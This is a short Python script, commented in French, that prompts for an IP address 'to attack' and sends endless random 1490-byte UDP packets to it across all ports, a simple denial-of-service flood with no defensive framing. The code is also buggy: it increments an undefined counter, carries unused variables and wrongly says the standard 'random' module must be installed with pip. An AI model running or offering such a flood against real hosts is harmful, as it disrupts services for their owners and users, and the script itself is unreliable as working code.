
import socket 
# pip ou pip3 install random
import random
# http://www.mon-ip.com/adresse-ip-site-internet.php
# ping monsite.com
# https://yogosha.com/fr/
site=input("Ip a attaquer:")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
port=1
Port=2
while True:
    print(port)
    sock.sendto(bytes,(site, port))
    sent=sent+1
    port=port+1
    invite=port+1
    if port==65534:
       port=1
